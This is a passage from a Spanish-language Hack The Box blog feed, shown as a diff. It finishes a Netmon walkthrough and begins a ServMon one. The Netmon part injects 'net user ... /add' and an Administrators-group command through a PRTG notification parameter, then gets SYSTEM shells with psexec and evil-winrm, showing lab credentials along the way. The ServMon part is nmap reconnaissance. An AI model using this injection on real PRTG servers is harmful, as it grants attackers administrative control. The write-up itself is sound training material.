+&lt;p&gt;Las credenciales de acceso son &lt;strong&gt;prtgadmin : PrTg@dmin2019&lt;/strong&gt; y ya hemos ingresado al sistema. Nos enfrentamos ante un PRTG Network Monitor de versión 18.1.37.13946, entonces vamos a tratar de buscar algún exploit público que nos ayude a ingresar al sistema.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ searchsploit prtg network monitor
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+ Exploit Title                                                                                 |  Path
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+PRTG Network Monitor 18.2.38 - &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Authenticated&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Remote Code Execution                           | windows/webapps/46527.sh
+PRTG Network Monitor 20.4.63.1412 - &lt;span class=&quot;s1&quot;&gt;'maps'&lt;/span&gt; Stored XSS                                          | windows/webapps/49156.txt
+PRTG Network Monitor &amp;lt; 18.1.39.1648 - Stack Overflow &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Denial of Service&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                       | windows_x86/dos/44500.py
+&lt;span class=&quot;nt&quot;&gt;-----------------------------------------------------------------------------------------------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;
+Shellcodes: No Results
+Papers: No Results
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos uno &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;windows/webapps/46527.sh&lt;/code&gt;, así que tratamos de ver que hace. Básicamente tenemos que crear una notificación en la parte de &lt;strong&gt;Setup &amp;gt; Notifications&lt;/strong&gt;, hacemos clicp en el símbol de &lt;strong&gt;+&lt;/strong&gt; en la parte superior derecha y luego click en &lt;strong&gt;Add new notification&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-netmon/netmon-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos vamos hasta abajo y habilitamos &lt;strong&gt;Execute Program&lt;/strong&gt; llenando los siguientes campos dela siguiente forma:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Program File&lt;/strong&gt;: Demo exe notification - outfile.ps1&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Parameter&lt;/strong&gt;: C:\Users\Public\tester.txt; el_comando_que_queremos_ejecutar&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;De acuerdo con el exploit, nos creamos un usuario a nivel de sistema y de paso lo agregamos al grupo &lt;strong&gt;Administrators&lt;/strong&gt;. Si podemos hacer esto, significa que quien corre el programa es un usuario administrador.&lt;/p&gt;
+
+&lt;p&gt;Por lo tanto ponemos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\Public\tester.txt; net user kamiyo k4miyo123$! /add; net localgroups Administrators kamiyo /add&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-netmon/netmon-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para ejecutar la notificación, nos vamos a la que hemos creado y damos click en el icono de un papel y un lapiz y nos aparecen varias opciones; seleccionamos aquella que parece una campanita.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-netmon/netmon-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Validamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crackmapexec smb&lt;/code&gt; si nuestro usuario fue creado:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.152 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'kamiyo'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'k4miyo123$!'&lt;/span&gt;
+SMB         10.10.10.152    445    NETMON           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows Server 2016 Standard 14393 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:NETMON&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:netmon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+SMB         10.10.10.152    445    NETMON           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] netmon&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;amiyo:k4miyo123&lt;span class=&quot;nv&quot;&gt;$!&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Fue creado y a parte tenemos posiblidad de ingresar a la máquina con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket-psexec&lt;/code&gt;. En caso que no queramos usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec&lt;/code&gt; podríamos tratar de agregar nuestro usuario al grupo &lt;strong&gt;Remote Management Users&lt;/strong&gt; y conectarnos a la máquina con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt; ya que se encuentra abierto el puerto 5985.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ impacket-psexec WORKGROUP/kamiyo:k4miyo123&lt;span class=&quot;se&quot;&gt;\$\!&lt;/span&gt;@10.10.10.152
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Requesting shares on 10.10.10.152.....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found writable share ADMIN&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Uploading file PrIscOHa.exe
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Opening SVCManager on 10.10.10.152.....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating service FyEk on 10.10.10.152.....
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting service FyEk.....
+&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
+Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.14393]
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2016 Microsoft Corporation. All rights reserved.
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
+nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
+
+C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.152 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'kamiyo'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'k4miyo123$!'&lt;/span&gt;
+
+Evil-WinRM shell v3.3
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;amiyo&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;netmon&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;amiyo
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;amiyo&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos dentro de la máquina como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Powershell" /><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina Netmon en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Sense</title><link href="http://localhost:4000/htb-sense/" rel="alternate" type="text/html" title="Hack The Box Sense" /><published>2022-02-06T00:00:00-06:00</published><updated>2022-02-06T00:00:00-06:00</updated><id>http://localhost:4000/htb-sense</id><content type="html" xml:base="http://localhost:4000/htb-sense/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-sense/banner-sense.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;sense&quot;&gt;Sense&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.60.&lt;/p&gt;
@@ -6147,735 +6499,4 @@ nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
 C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ya somos el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="VBA" /><category term="File_Misconfiguration" /><category term="Cryptography" /><summary type="html">Resolución de la máquina Nest en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box ServMon</title><link href="http://localhost:4000/htb-servmon/" rel="alternate" type="text/html" title="Hack The Box ServMon" /><published>2022-01-15T00:00:00-06:00</published><updated>2022-01-15T00:00:00-06:00</updated><id>http://localhost:4000/htb-servmon</id><content type="html" xml:base="http://localhost:4000/htb-servmon/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-servmon/banner-servmon.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;servmon&quot;&gt;ServMon&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.184.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.184
-PING 10.10.10.184 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.184&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.184: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;324 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.184 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 324.431/324.431/324.431/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.184 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-15 19:53 CST
-Initiating SYN Stealth Scan at 19:53        
-Scanning 10.10.10.184 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]        
-Discovered open port 445/tcp on 10.10.10.184  
-Discovered open port 135/tcp on 10.10.10.184  
-Discovered open port 21/tcp on 10.10.10.184   
-Discovered open port 22/tcp on 10.10.10.184   
-Discovered open port 139/tcp on 10.10.10.184 
-Discovered open port 80/tcp on 10.10.10.184  
-Discovered open port 49665/tcp on 10.10.10.184
-Discovered open port 49668/tcp on 10.10.10.184
-Discovered open port 49666/tcp on 10.10.10.184
-Discovered open port 49669/tcp on 10.10.10.184
-Discovered open port 5666/tcp on 10.10.10.184 
-Discovered open port 6063/tcp on 10.10.10.184
-Discovered open port 49670/tcp on 10.10.10.184                                                                                   
-Discovered open port 8443/tcp on 10.10.10.184
-Discovered open port 49664/tcp on 10.10.10.184
-Discovered open port 6699/tcp on 10.10.10.184
-Discovered open port 49667/tcp on 10.10.10.184                                                                                   
-Discovered open port 5040/tcp on 10.10.10.184                                                                                    
-Completed SYN Stealth Scan at 19:53, 15.86s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.184           
-Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Scanned at 2022-01-15 19:53:26 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;15s  
-Not shown: 63964 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 1553 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
-PORT      STATE SERVICE      REASON
-21/tcp    open  ftp          syn-ack ttl 127
-22/tcp    open  ssh          syn-ack ttl 127
-80/tcp    open  http         syn-ack ttl 127
-135/tcp   open  msrpc        syn-ack ttl 127
-139/tcp   open  netbios-ssn  syn-ack ttl 127
-445/tcp   open  microsoft-ds syn-ack ttl 127
-5040/tcp  open  unknown      syn-ack ttl 127
-5666/tcp  open  nrpe         syn-ack ttl 127
-6063/tcp  open  x11          syn-ack ttl 127
-6699/tcp  open  napster      syn-ack ttl 127
-8443/tcp  open  https-alt    syn-ack ttl 127
-49664/tcp open  unknown      syn-ack ttl 127
-49665/tcp open  unknown      syn-ack ttl 127
-49666/tcp open  unknown      syn-ack ttl 127
-49667/tcp open  unknown      syn-ack ttl 127
-49668/tcp open  unknown      syn-ack ttl 127
-49669/tcp open  unknown      syn-ack ttl 127
-49670/tcp open  unknown      syn-ack ttl 127
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;15.96 seconds
-           Raw packets sent: 78068 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.435MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 65689 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.628MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.184
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 21,22,80,135,139,445,5040,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p21&lt;/span&gt;,22,80,135,139,445,5040,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 10.10.10.184 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted  
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-15 19:54 CST                                                                  
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.184                                                                                                
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                                                      
-                                                                                                                                 
-PORT      STATE SERVICE       VERSION                                                                                            
-21/tcp    open  ftp           Microsoft ftpd                                                                                     
-| ftp-anon: Anonymous FTP login allowed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                           
-|_01-18-20  11:05AM       &amp;lt;DIR&amp;gt;          Users                                                                                   
-| ftp-syst:                                                                                                                      
-|_  SYST: Windows_NT                                                                                                             
-22/tcp    open  ssh           OpenSSH for_Windows_7.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                             
-| ssh-hostkey:                                                                                                                   
-|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                   
-|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                  
-|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                
-80/tcp    open  http                                                                                                             
-|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).                                                                             
-| fingerprint-strings:                                                                                                           
-|   GetRequest, HTTPOptions, RTSPRequest:                                                                                        
-|     HTTP/1.1 200 OK                                                                                                            
-|     Content-type: text/html                                                                                                    
-|     Content-Length: 340                                                                                                        
-|     Connection: close                                                                                                          
-|     AuthInfo:                                                                                                                  
-|     &amp;lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&amp;gt;  
-|     &amp;lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&amp;gt;                                                                                
-|     &amp;lt;head&amp;gt;                                                                                                                     
-|     &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;                                                                                                            
-|     &amp;lt;script type=&quot;text/javascript&quot;&amp;gt;                                                                                            
-|     window.location.href = &quot;Pages/login.htm&quot;;                                                                                  
-|     &amp;lt;/script&amp;gt;                                                                                                                  
-|     &amp;lt;/head&amp;gt;                                                   
-|     &amp;lt;body&amp;gt;                                                    
-|     &amp;lt;/body&amp;gt;                                                   
-|     &amp;lt;/html&amp;gt;                                                   
-|   NULL:                                                       
-|     HTTP/1.1 408 Request Timeout                 
-|     Content-type: text/html                                                                                                    
-|     Content-Length: 0                                         
-|     Connection: close                                                                                                          
-|_    AuthInfo:
-135/tcp   open  msrpc         Microsoft Windows RPC                                                                              
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                      
-445/tcp   open  microsoft-ds?                                                                                                    
-5040/tcp  open  unknown                                                                                                          
-5666/tcp  open  tcpwrapped                                                                                                       
-6063/tcp  open  x11?                                                                                                             
-6699/tcp  open  napster?                                                                                                         
-8443/tcp  open  ssl/https-alt
-| fingerprint-strings: 
-|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
-|     HTTP/1.1 404
-|     Content-Length: 18
-|     Document not found
-|   GetRequest: 
-|     HTTP/1.1 302
-|     Content-Length: 0
-|     Location: /index.html
-|     iday
-|_    :Saturday
-| ssl-cert: Subject: commonName=localhost
-| Not valid before: 2020-01-14T13:24:20
-|_Not valid after:  2021-01-13T13:24:20
-| http-title: NSClient++
-|_Requested resource was /index.html
-|_ssl-date: TLS randomness does not represent time
-49664/tcp open  msrpc         Microsoft Windows RPC
-49665/tcp open  msrpc         Microsoft Windows RPC
-49666/tcp open  msrpc         Microsoft Windows RPC
-49667/tcp open  msrpc         Microsoft Windows RPC
-49668/tcp open  msrpc         Microsoft Windows RPC
-49669/tcp open  msrpc         Microsoft Windows RPC
-49670/tcp open  msrpc         Microsoft Windows RPC
-2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at http
-s://nmap.org/cgi-bin/submit.cgi?new-service :
-==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port80-TCP:V=7.92%I=7%D=1/15%Time=61E37ADB%P=x86_64-pc-linux-gnu%r(NULL
-SF:,6B,&quot;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
-SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
-SF:\r\n&quot;)%r(GetRequest,1B4,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
-SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
-SF:20\r\n\r\n\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&quot;-//W3C//DTD\x20X
-SF:HTML\x201\.0\x20Transitional//EN\&quot;\x20\&quot;http://www\.w3\.org/TR/xhtml1/D
-SF:TD/xhtml1-transitional\.dtd\&quot;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&quot;http://www\.w3\.
-SF:org/1999/xhtml\&quot;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\
-SF:x20\x20\x20&amp;lt;script\x20type=\&quot;text/javascript\&quot;&amp;gt;\r\n\x20\x20\x20\x20\x20
-SF:\x20\x20\x20window\.location\.href\x20=\x20\&quot;Pages/login\.htm\&quot;;\r\n\x2
-SF:0\x20\x20\x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&quot;)
